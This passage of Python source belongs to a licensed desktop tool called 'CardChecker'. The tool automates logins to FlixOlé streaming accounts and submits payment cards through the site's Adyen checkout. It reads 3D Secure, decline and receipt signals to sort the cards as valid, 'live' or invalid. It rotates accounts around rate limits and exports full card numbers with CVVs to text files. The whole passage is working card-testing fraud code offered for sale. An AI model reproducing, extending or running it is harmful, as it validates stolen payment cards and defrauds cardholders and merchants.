                # ✅ 3DS return — esperar que resuelva hacia FlixOlé
                if "threeDS/return" in url or "threeDS2.shtml" in url:
                    self.after(0, self._log, f"   ► Verificando autenticación 3D Secure...")
                    for i in range(25):
                        await page.wait_for_timeout(1_000)
                        url  = page.url
                        body = (await page.inner_text("body")).lower()
                        code = payment_result["code"]
                        # Si ya tenemos código real de la API (no fingerprint), salir a evaluarlo
                        if code and code not in ("Success",):
                            break
                        # Si el banner de error ya apareció, capturarlo ahora mismo
                        if ("el pago no pudo ser confirmado" in body or "pago no pudo" in body or
                                "payment information could not be confirmed" in body or "could not be confirmed" in body):
                            import re
                            motivo = payment_result["reason"] or ""
                            if not motivo:
                                m = re.search(r'(?:motivo|reason)[:\s]+([^\n\.]+)', body, re.IGNORECASE)
                                if m:
                                    motivo = m.group(1).strip()
                            return False, f"Rechazada: {motivo}" if motivo else "Rechazada: pago no confirmado"
                        # Si llevamos más de 8s en threeDS2.shtml sin avanzar = OTP interactivo
                        if i >= 7 and "threeDS2.shtml" in url:
                            self.after(0, self._log, f"   ► Requiere verificación adicional del banco")
                            return False, "Rechazada: Requiere OTP del banco"
                        # Si regresó a FlixOlé (sin 3DS en la URL), salir
                        if "ver.flixole.com" in url and "threeDS" not in url and "checkoutshopper" not in url:
                            self.after(0, self._log, f"   ► 3DS resuelto → {url[:60]}")
                            break
                    else:
                        # Expiró — dar 3s extra para eventos tardíos
                        await page.wait_for_timeout(3_000)
                        code = payment_result["code"]
                        url  = page.url
                        body = (await page.inner_text("body")).lower()
                        if code and code not in ("Success",):
                            pass  # se evalúa abajo en el continue
                        elif ("el pago no pudo ser confirmado" in body or "pago no pudo" in body or
                                "payment information could not be confirmed" in body or "could not be confirmed" in body):
                            import re
                            motivo = payment_result["reason"] or ""
                            if not motivo:
                                m = re.search(r'(?:motivo|reason)[:\s]+([^\n\.]+)', body, re.IGNORECASE)
                                if m:
                                    motivo = m.group(1).strip()
                            return False, f"Rechazada: {motivo}" if motivo else "Rechazada: pago no confirmado"
                        elif "autenticaci" in body and "3d" in body:
                            # Banner "Autenticación 3D fallida"
                            return False, "Rechazada: Autenticación 3D fallida"
                        else:
                            return False, "Requiere autenticación 3DS (banco)"
                    # Dar 2s extra para que lleguen eventos de red tardíos antes de continuar
                    await page.wait_for_timeout(2_000)
                    url  = page.url
                    body = (await page.inner_text("body")).lower()
                    # Verificar banner tardío
                    if ("el pago no pudo ser confirmado" in body or "pago no pudo" in body or
                            "payment information could not be confirmed" in body or "could not be confirmed" in body):
                        import re
                        motivo = payment_result["reason"] or ""
                        if not motivo:
                            m = re.search(r'motivo[:\s]+([^\n\.]+)', body, re.IGNORECASE)
                            if m:
                                motivo = m.group(1).strip()
                        return False, f"Rechazada: {motivo}" if motivo else "Rechazada: pago no confirmado"
                    continue

                # ✅ Página de recibo = éxito confirmado
                if "receipt" in url:
                    self.after(0, self._log, f"   ► URL receipt detectada: {url[:60]}")
                    return True, "Tarjeta válida"
                if "checkout" in url and any(k in url for k in ["transactionId", "redirectResult"]):
                    self.after(0, self._log, f"   ► URL checkout éxito: {url[:60]}")
                    return True, "Tarjeta válida"
                # ✅ Éxito en flujo "Cambiar método de pago" — salió del setup
                if "settings/payment" in url and "setup" not in url:
                    # Verificar que no haya banner de error antes de declarar éxito
                    if ("el pago no pudo ser confirmado" in body or
                            "payment information could not be confirmed" in body or
                            "could not be confirmed" in body or
                            "pago no pudo" in body):
                        import re
                        motivo = payment_result["reason"] or ""
                        if not motivo:
                            m = re.search(r'(?:motivo|reason)[:\s]+([^\n\.]+)', body, re.IGNORECASE)
                            if m:
                                motivo = m.group(1).strip()
                        return False, f"Rechazada: {motivo}" if motivo else "Rechazada: pago no confirmado"
                    self.after(0, self._log, f"   ► Regresó a settings/payment = método actualizado")
                    return True, "Tarjeta válida"

                # Sigue en setup — leer iframe de Adyen para detectar error
                if "settings/payment/setup" in url:
                    final_code = payment_result["code"]
                    if final_code and final_code not in ("Success",):
                        final_reason = payment_result["reason"] or ""
                        if final_code in ("Authorised", "Pending"):
                            return True, "Tarjeta válida"
                        elif final_code == "Refused":
                            return False, f"Rechazada: {final_reason or 'Rechazada'}"
                        else:
                            return False, f"Rechazada: {final_code}"
                    # Sin código API — leer TODOS los frames buscando mensaje de error
                    try:
                        for frame in page.frames:
                            try:
                                frame_body = (await frame.inner_text("body")).lower()
                                if "invalid card number" in frame_body or "número de tarjeta inválido" in frame_body:
                                    return False, "Rechazada: Invalid Card Number"
                                if "card expired" in frame_body or "tarjeta caducada" in frame_body:
                                    return False, "Rechazada: Tarjeta expirada"
                                if "refused" in frame_body or "declined" in frame_body:
                                    return False, "Rechazada: Pago rechazado"
                            except Exception:
                                pass
                    except Exception:
                        pass
                    continue

                # ✅ Texto de éxito
                if any(k in body for k in ["pago exitoso", "¡pago", "confirmación de pago", "en proceso"]):
                    return True, "Tarjeta válida"

                # ❌ Resultado de error dentro de frames de Adyen (ej: "Invalid Card Number")
                try:
                    for frame in page.frames:
                        try:
                            frame_body = (await frame.inner_text("body")).lower()
                            if "invalid card number" in frame_body or "número de tarjeta inválido" in frame_body:
                                return False, "Rechazada: Invalid Card Number"
                            if "card expired" in frame_body or "tarjeta caducada" in frame_body:
                                return False, "Rechazada: Tarjeta expirada"
                        except Exception:
                            pass
                except Exception:
                    pass

                # ❌ Banner de FlixOlé — español e inglés
                if ("el pago no pudo ser confirmado" in body or "pago no pudo" in body or
                        "payment information could not be confirmed" in body or "could not be confirmed" in body):
                    import re
                    motivo = payment_result["reason"] or ""
                    if not motivo:
                        for sel in [
                            '[class*="alert"]', '[class*="error"]', '[class*="notification"]',
                            '[class*="toast"]', '[class*="message"]', '[role="alert"]'
                        ]:
                            el = page.locator(sel).first
                            if await el.count() > 0:
                                txt = (await el.inner_text()).strip()
                                if "motivo" in txt.lower() or "reason" in txt.lower() or "pago no pudo" in txt.lower() or "could not be confirmed" in txt.lower():
                                    m = re.search(r'(?:motivo|reason)[:\s]+([^\n\.]+)', txt, re.IGNORECASE)
                                    if m:
                                        motivo = m.group(1).strip()
                                    break
                        if not motivo:
                            m = re.search(r'(?:motivo|reason)[:\s]+([^\n\.]+)', body, re.IGNORECASE)
                            if m:
                                motivo = m.group(1).strip()
                    return False, f"Rechazada: {motivo}" if motivo else "Rechazada: pago no confirmado"

                # ❌ Mensaje de error visible de Adyen
                if any(k in body for k in [
                    "invalid card number", "número de tarjeta inválido",
                    "card expired", "tarjeta caducada",
                    "refused", "denegad", "declined", "do not honor",
                    "insufficient funds", "transaction not permitted"
                ]):
                    # Mapear keywords a mensajes claros
                    error_map = {
                        "invalid card number":            "Invalid Card Number",
                        "número de tarjeta inválido":     "Invalid Card Number",
                        "card expired":                   "Tarjeta expirada",
                        "tarjeta caducada":               "Tarjeta expirada",
                        "do not honor":                   "Do Not Honor",
                        "insufficient funds":             "Insufficient Funds",
                        "transaction not permitted":      "Transaction Not Permitted",
                        "refused":                        "Pago rechazado",
                        "denegad":                        "Pago denegado",
                        "declined":                       "Pago declinado",
                    }
                    mensaje = next((v for k, v in error_map.items() if k in body), "Pago rechazado")
                    return False, f"Rechazada: {mensaje}"

                # ⚠ 3DS activo sin return — esperar a que llegue al return
                if "threeDS2" in url or "threeds" in url.lower():
                    self.after(0, self._log, f"   ► 3DS cargando: {url[:60]}")
                    # Verificar si el banner de error ya apareció en esta URL
                    if ("el pago no pudo ser confirmado" in body or "pago no pudo" in body or
                            "payment information could not be confirmed" in body or "could not be confirmed" in body):
                        import re
                        motivo = payment_result["reason"] or ""
                        if not motivo:
                            m = re.search(r'motivo[:\s]+([^\n\.]+)', body, re.IGNORECASE)
                            if m:
                                motivo = m.group(1).strip()
                        return False, f"Rechazada: {motivo}" if motivo else "Rechazada: pago no confirmado"
                    continue

                # ❌ Rate limit
                if any(k in body for k in ["too many requests", "please wait"]):
                    return False, "RATE_LIMIT"

                # ✅/❌ Home
                if url.rstrip("/") in ["https://ver.flixole.com", "https://ver.flixole.com/"]:
                    self.after(0, self._log, f"   ► Home detectada. suscribete={('suscríbete' in body or 'suscribete' in body)}")
                    if "suscríbete" not in body and "suscribete" not in body:
                        return True, "Tarjeta válida"
                    return False, "Tarjeta rechazada"

            # Timeout — verificar estado de cuenta como último recurso
            await page.goto("https://ver.flixole.com/settings/subscription", wait_until="domcontentloaded")
            await page.wait_for_timeout(2_000)
            plan_body = (await page.inner_text("body")).lower()
            if "actualmente no tienes" not in plan_body and "elige tu plan" not in plan_body:
                return True, "Tarjeta válida"
            return False, "Tarjeta rechazada"

        while True:
            # Verificar si se solicitó detener
            if getattr(self, '_stop_flag', False):
                self.after(0, self._log, f"[{worker_id}] Detenido por usuario")
                break

            # Tomar una tarjeta de la cola
            try:
                card = card_queue.get_nowait()
            except asyncio.QueueEmpty:
                break  # No quedan tarjetas

            # Tomar una cuenta disponible
            account = None
            tried_accounts = []
            while True:
                try:
                    account = available_accounts.get_nowait()
                except asyncio.QueueEmpty:
                    # No hay cuentas disponibles — devolver tarjeta y terminar
                    if tried_accounts:
                        # Devolver todas las cuentas probadas
                        for acc in tried_accounts:
                            await available_accounts.put(acc)
                    await card_queue.put(card)
                    self.after(0, self._log, f"[{worker_id}] Sin cuentas disponibles, terminando")
                    card_queue.task_done() if hasattr(card_queue, 'task_done') else None
                    return
                break

            result = {
                "worker":    worker_id,
                "account":   account["email"],
                "number":    f"****{card['number'][-4:]}",
                "expiry":    f"{card['expiry_month']}/{card['expiry_year']}",
                "status":    "FAIL",
                "message":   "",
                "timestamp": datetime.now().isoformat(),
            }
            context = await browser.new_context()
            page    = await context.new_page()
            try:
                if getattr(self, '_stop_flag', False):
                    await context.close()
                    break

                self.after(0, self._log, f"[{worker_id}] Login {account['email']}...")
                await _login(page, account["email"], account["password"])

                if getattr(self, '_stop_flag', False):
                    await context.close()
                    break

                self.after(0, self._log, f"[{worker_id}] Checkout ****{card['number'][-4:]}...")
                found = await _select_plan(page)

                if found == "has_subscription":
                    # Cuenta bloqueada — descartar y devolver tarjeta a la cola
                    self.after(0, self._log, f"[{worker_id}] {account['email']} tiene suscripción — descartando cuenta")
                    await card_queue.put(card)  # devolver tarjeta
                    # NO devolver esta cuenta al pool
                    await context.close()
                    continue  # siguiente iteración con otra cuenta

                elif not found:
                    result["message"] = "No se encontró el formulario de pago"
                    # Devolver la cuenta al pool para futuros intentos
                    await available_accounts.put(account)
                else:
                    self.after(0, self._log, f"[{worker_id}] Enviando pago ****{card['number'][-4:]}...")
                    await _fill(page, card)
                    success, message = await _submit(page)
                    is_live = not success and "cvv" in message.lower()
                    result["status"]  = "OK" if success else ("LIVE" if is_live else "FAIL")
                    result["message"] = message
                    if message == "RATE_LIMIT":
                        await asyncio.sleep(10)
                    # Si la cuenta ya tenía suscripción (flujo cambiar método),
                    # siempre la devolvemos al pool — puede procesar más tarjetas
                    # Si no tenía suscripción y el pago fue exitoso, la cuenta
                    # quedó con suscripción activa — también la devolvemos para reusar
                    await available_accounts.put(account)

            except PlaywrightTimeout as e:
                result["message"] = f"Timeout: {str(e)[:80]}"
                await available_accounts.put(account)
            except Exception as e:
                result["message"] = f"Error: {str(e)[:120]}"
                self.after(0, self._log, f"[{worker_id}] ❌ {e}")
                await available_accounts.put(account)
            finally:
                pass
                await context.close()

            await on_result(result)


    def _on_done(self, results):
        self._running = False
        stopped = self._stop_flag  # guardar antes de resetear
        self._stop_flag = False
        self.run_btn.configure(text="▶  INICIAR", state="normal",
                               fg_color="#2e7d32", hover_color="#1b5e20")

        # Marcar como canceladas las filas que quedaron en estado pendiente
        if stopped:
            for row in self._rows.values():
                current_status = row.status_label.cget("text")
                if current_status in ("⏳", "🔄"):
                    row.status_label.configure(text="⛔", text_color=COLOR_SUBTEXT)
                    row.acc_label.configure(text="—", text_color=COLOR_SUBTEXT)
                    row.msg_label.configure(text="Detenido", text_color=COLOR_SUBTEXT)

        ok = sum(1 for r in results if r["status"] == "OK")
        status_text = (
            f"● Detenido — {ok}/{len(results)} aprobadas"
            if stopped
            else f"● Listo — {ok}/{len(results)} aprobadas"
        )
        self.status_badge.configure(
            text=status_text,
            text_color=COLOR_PENDING if stopped else (COLOR_SUCCESS if ok > 0 else COLOR_SUBTEXT)
        )
        self._log(
            f"─── {'Detenido' if stopped else 'Completado'}: "
            f"{ok} OK / {len(results)-ok} FAIL ───"
        )

        # Resultados guardados — el usuario los ve con los botones Válidas/Inválidas
        self._results = results

    def _open_results_popup(self, status_filter: str):
        """Abre el popup filtrado por válidas, live o inválidas desde los botones del header."""
        if not hasattr(self, "_results") or not self._results:
            from tkinter import messagebox
            messagebox.showinfo("Sin datos", "Aún no hay resultados.")
            return
        filtered = [r for r in self._results if r["status"] == status_filter]
        if not filtered:
            from tkinter import messagebox
            label = {"OK": "válidas", "LIVE": "live (CVV inválido)", "FAIL": "inválidas"}.get(status_filter, status_filter)
            messagebox.showinfo("Sin datos", f"No hay tarjetas {label} aún.")
            return
        self._show_single_popup(filtered, status_filter)

    def _show_single_popup(self, filtered, status_filter):
        """Popup con un solo bloque (válidas o inválidas) + copiar + guardar txt."""
        from tkinter import filedialog, messagebox

        is_ok  = status_filter == "OK"
        is_live = status_filter == "LIVE"
        title  = "✅  Tarjetas válidas" if is_ok else ("⚠  Live — CVV inválido" if is_live else "❌  Tarjetas inválidas")
        color  = COLOR_SUCCESS if is_ok else (COLOR_PENDING if is_live else COLOR_FAIL)
        hover  = "#1b5e20" if is_ok else ("#5a3400" if is_live else "#7f0000")
        fg_btn = "#2e7d32" if is_ok else ("#7a4a00" if is_live else COLOR_FAIL)

        lines = []
        for res in filtered:
            last4  = res["number"].replace("*", "")
            month, year = res["expiry"].split("/")
            original = next((c for c in self._cards if c["number"][-4:] == last4), None)
            if original:
                lines.append(
                    f"{original['number']} | {original['expiry_month']} | "
                    f"{original['expiry_year']} | {original['cvv']}"
                )
            else:
                lines.append(f"****{last4} | {month} | {year} | ???")

        content = "\n".join(lines)

        popup = ctk.CTkToplevel(self)
        popup.title(title)
        popup.geometry("580x420")
        popup.resizable(False, False)
        popup.configure(fg_color=COLOR_BG)
        popup.grab_set()
        popup.focus_set()

        ctk.CTkLabel(popup, text=title,
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color=color).pack(pady=(18, 8))

        ctk.CTkLabel(popup,
                     text=f"{len(lines)} tarjeta{'s' if len(lines) != 1 else ''}",
                     font=ctk.CTkFont(size=11),
                     text_color=COLOR_SUBTEXT).pack()

        box = ctk.CTkTextbox(popup, fg_color=COLOR_PANEL,
                             text_color=COLOR_TEXT,
                             font=ctk.CTkFont(size=12, family="Courier"))
        box.pack(fill="both", expand=True, padx=20, pady=10)
        box.insert("1.0", content)
        box.configure(state="disabled")

        # Fila de botones
        btn_row = ctk.CTkFrame(popup, fg_color="transparent")
        btn_row.pack(fill="x", padx=20, pady=(0, 16))

        copy_btn = ctk.CTkButton(
            btn_row, text="📋  Copiar", width=140, height=32,
            fg_color=fg_btn, hover_color=hover,
            command=lambda: self._copy_and_confirm(content, copy_btn)
        )
        copy_btn.pack(side="left", padx=(0, 8))

        def save_txt():
            label = "validas" if is_ok else ("live_cvv_invalido" if is_live else "invalidas")
            path = filedialog.asksaveasfilename(
                parent=popup,
                defaultextension=".txt",
                filetypes=[("Text", "*.txt"), ("All", "*.*")],
                initialfile=f"tarjetas_{label}.txt"
            )
            if path:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(content)
                messagebox.showinfo("Guardado",
                    f"{len(lines)} tarjeta{'s' if len(lines)!=1 else ''} guardada{'s' if len(lines)!=1 else ''} en:\n{path}",
                    parent=popup)

        ctk.CTkButton(
            btn_row, text="💾  Guardar .txt", width=140, height=32,
            fg_color=COLOR_PANEL, hover_color=COLOR_SUBTEXT,
            command=save_txt
        ).pack(side="left", padx=(0, 8))

        ctk.CTkButton(
            btn_row, text="Cerrar", width=90, height=32,
            fg_color=COLOR_CARD, hover_color=COLOR_SUBTEXT,
            command=popup.destroy
        ).pack(side="right")

    def _copy_and_confirm(self, text, btn):
        """Copia al portapapeles y cambia el texto del botón brevemente."""
        self.clipboard_clear()
        self.clipboard_append(text)
        original = btn.cget("text")
        btn.configure(text="✅  Copiado")
        self.after(1500, lambda: btn.configure(text=original))

    def _show_results_popup(self, results):
        """Muestra un popup con las tarjetas válidas e inválidas y botón copiar."""
        import re

        ok_cards = [r for r in results if r["status"] == "OK"]
        fail_cards = [r for r in results if r["status"] != "OK"]

        def build_lines(cards):
            lines = []
            for res in cards:
                last4 = res["number"].replace("*", "")
                expiry = res["expiry"]
                month, year = expiry.split("/")
                original = next(
                    (c for c in self._cards if c["number"][-4:] == last4), None
                )
                if original:
                    lines.append(
                        f"{original['number']} | {original['expiry_month']} | "
                        f"{original['expiry_year']} | {original['cvv']}"
                    )
                else:
                    lines.append(f"****{last4} | {month} | {year} | ???")
            return "\n".join(lines) if lines else "— ninguna —"

        ok_text   = build_lines(ok_cards)
        fail_text = build_lines(fail_cards)

        popup = ctk.CTkToplevel(self)
        popup.title("Resultados")
        popup.geometry("620x520")
        popup.resizable(False, False)
        popup.configure(fg_color=COLOR_BG)
        popup.grab_set()
        popup.focus_set()

        ctk.CTkLabel(popup, text="RESULTADOS",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color=COLOR_TEXT).pack(pady=(18, 4))

        # ── Válidas ──────────────────────────────────────────
        ctk.CTkLabel(popup,
                     text=f"✅  Válidas ({len(ok_cards)})",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=COLOR_SUCCESS).pack(anchor="w", padx=20, pady=(10, 2))

        ok_box = ctk.CTkTextbox(popup, height=140, fg_color=COLOR_PANEL,
                                text_color=COLOR_TEXT,
                                font=ctk.CTkFont(size=12, family="Courier"))
        ok_box.pack(fill="x", padx=20)
        ok_box.insert("1.0", ok_text)
        ok_box.configure(state="disabled")

        ctk.CTkButton(
            popup, text="📋  Copiar válidas", width=160, height=30,
            fg_color="#2e7d32", hover_color="#1b5e20",
            command=lambda: (self.clipboard_clear(),
                             self.clipboard_append(ok_text),
                             self._flash_btn(popup, "✅  Copiado"))
        ).pack(anchor="e", padx=20, pady=(4, 0))

        # ── Inválidas ─────────────────────────────────────────
        ctk.CTkLabel(popup,
                     text=f"❌  Inválidas ({len(fail_cards)})",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=COLOR_FAIL).pack(anchor="w", padx=20, pady=(14, 2))

        fail_box = ctk.CTkTextbox(popup, height=140, fg_color=COLOR_PANEL,
                                  text_color=COLOR_TEXT,
                                  font=ctk.CTkFont(size=12, family="Courier"))
        fail_box.pack(fill="x", padx=20)
        fail_box.insert("1.0", fail_text)
        fail_box.configure(state="disabled")

        ctk.CTkButton(
            popup, text="📋  Copiar inválidas", width=160, height=30,
            fg_color=COLOR_FAIL, hover_color="#7f0000",
            command=lambda: (self.clipboard_clear(),
                             self.clipboard_append(fail_text),
                             self._flash_btn(popup, "✅  Copiado"))
        ).pack(anchor="e", padx=20, pady=(4, 0))

        ctk.CTkButton(
            popup, text="Cerrar", width=100, height=32,
            fg_color=COLOR_PANEL, hover_color=COLOR_SUBTEXT,
            command=popup.destroy
        ).pack(pady=(14, 0))

    def _flash_btn(self, parent, msg):
        """Muestra brevemente un label de confirmación de copiado."""
        lbl = ctk.CTkLabel(parent, text=msg,
                           text_color=COLOR_SUCCESS,
                           font=ctk.CTkFont(size=11))
        lbl.place(relx=0.5, rely=0.97, anchor="s")
        parent.after(1500, lbl.destroy)

    def _export_txt(self, status_filter: str):
        """Exporta tarjetas OK o FAIL en formato número | mes | año | cvv"""
        if not hasattr(self, "_results") or not self._results:
            messagebox.showinfo("Sin datos", "Aún no hay resultados para exportar.")
            return

        # Filtrar y reconstruir el formato original
        filtered = [r for r in self._results if r["status"] == status_filter]
        if not filtered:
            label = "aprobadas" if status_filter == "OK" else "fallidas"
            messagebox.showinfo("Sin datos", f"No hay tarjetas {label} para exportar.")
            return

        # Recuperar datos completos de las tarjetas originales por los últimos 4 dígitos
        lines = []
        for res in filtered:
            last4 = res["number"].replace("*", "")  # "****1234" → "1234"
            expiry = res["expiry"]                   # "12/2027"
            month, year = expiry.split("/")
            # Buscar la tarjeta original para recuperar número completo y cvv
            original = next(
                (c for c in self._cards if c["number"][-4:] == last4), None
            )
            if original:
                lines.append(
                    f"{original['number']} | {original['expiry_month']} | "
                    f"{original['expiry_year']} | {original['cvv']}"
                )
            else:
                lines.append(f"****{last4} | {month} | {year} | ???")

        label = "validas" if status_filter == "OK" else "invalidas"
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text", "*.txt"), ("All", "*.*")],
            initialfile=f"tarjetas_{label}.txt"
        )
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            messagebox.showinfo("Exportado",
                f"{len(lines)} tarjeta{'s' if len(lines)!=1 else ''} guardada{'s' if len(lines)!=1 else ''} en:\n{path}")


    def _check_license(self) -> bool:
        """
        Verifica la licencia al inicio de la app.
        Retorna True si es válida, False si no (y muestra pantalla de activación).
        """
        LICENSE_FILE = Path.home() / ".cardchecker_license"

        # Leer licencia guardada si existe
        stored_key = None
        if LICENSE_FILE.exists():
            try:
                stored_key = LICENSE_FILE.read_text().strip()
            except Exception:
                pass

        # Si hay licencia guardada, validarla
        if stored_key:
            ok, reason = validate_license(stored_key)
            if ok:
                # Licencia válida — mostrar fecha de vencimiento en el título
                expiry = get_expiry_date(stored_key)
                if expiry:
                    self.after(100, lambda: self.title(f"CardChecker — Licencia válida hasta {expiry}"))
                return True
            else:
                # Licencia inválida — mostrar razón y pedir nueva
                if reason != "NO_INTERNET":
                    LICENSE_FILE.unlink(missing_ok=True)
                msg = error_message(reason)
                messagebox.showerror("Licencia inválida", msg)

        # No hay licencia o es inválida — mostrar pantalla de activación
        return self._show_activation_dialog()

    def _show_activation_dialog(self) -> bool:
        """Muestra ventana de activación y retorna True si se activó correctamente."""
        dialog = ctk.CTkToplevel(self)
        dialog.title("Activar CardChecker")
        dialog.geometry("500x350")
        dialog.resizable(False, False)
        dialog.configure(fg_color=COLOR_BG)
        dialog.transient(self)
        dialog.grab_set()

        # Centrar en pantalla
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (500 // 2)
        y = (dialog.winfo_screenheight() // 2) - (350 // 2)
        dialog.geometry(f"500x350+{x}+{y}")

        activated = [False]  # lista para poder modificar desde closure

        ctk.CTkLabel(
            dialog, text="🔐 Activación de Licencia",
            font=ctk.CTkFont(size=22, weight="bold"),
            text_color=COLOR_ACCENT
        ).pack(pady=(30, 10))

        ctk.CTkLabel(
            dialog, text="Ingresa tu clave de licencia para activar la app",
            font=ctk.CTkFont(size=13),
            text_color=COLOR_SUBTEXT
        ).pack(pady=(0, 20))

        # Hardware ID del dispositivo
        hw_id = get_hardware_id()
        ctk.CTkLabel(
            dialog, text=f"ID del dispositivo: {hw_id[:16]}...",
            font=ctk.CTkFont(size=11),
            text_color=COLOR_SUBTEXT
        ).pack(pady=(0, 20))

        # Campo de licencia
        entry = ctk.CTkEntry(
            dialog, width=380, height=40,
            placeholder_text="CCR-XXXX-XXXX-XXXX",
            font=ctk.CTkFont(size=14),
            justify="center"
        )
        entry.pack(pady=10)

        status_label = ctk.CTkLabel(dialog, text="", font=ctk.CTkFont(size=12))
        status_label.pack(pady=10)

        def activate():
            key = entry.get().strip()
            if not key:
                status_label.configure(text="⚠ Ingresa una clave de licencia", text_color=COLOR_ACCENT)
                return

            status_label.configure(text="⏳ Verificando...", text_color=COLOR_SUBTEXT)
            dialog.update()

            ok, reason = validate_license(key)

            if ok:
                # Guardar licencia
                LICENSE_FILE = Path.home() / ".cardchecker_license"
                LICENSE_FILE.write_text(key)
                status_label.configure(text="✅ Licencia activada correctamente", text_color=COLOR_SUCCESS)
                dialog.after(1500, dialog.destroy)
                activated[0] = True
            else:
                msg = error_message(reason)
                status_label.configure(text=f"❌ {msg.split('.')[0]}", text_color=COLOR_ACCENT)

        btn = ctk.CTkButton(
            dialog, text="Activar", width=200, height=40,
            font=ctk.CTkFont(size=14, weight="bold"),
            fg_color=COLOR_ACCENT, hover_color="#d13a52",
            command=activate
        )
        btn.pack(pady=20)

        # Enter activa
        entry.bind("<Return>", lambda e: activate())

        # Botón salir
        ctk.CTkButton(
            dialog, text="Salir sin activar", width=120, height=30,
            fg_color="transparent", hover_color=COLOR_CARD,
            font=ctk.CTkFont(size=11),
            command=dialog.destroy
        ).pack(pady=(10, 0))

        dialog.wait_window()
        return activated[0]


if __name__ == "__main__":
    import multiprocessing
    multiprocessing.freeze_support()  # requerido por PyInstaller en Windows
    app = App()
    app.mainloop()
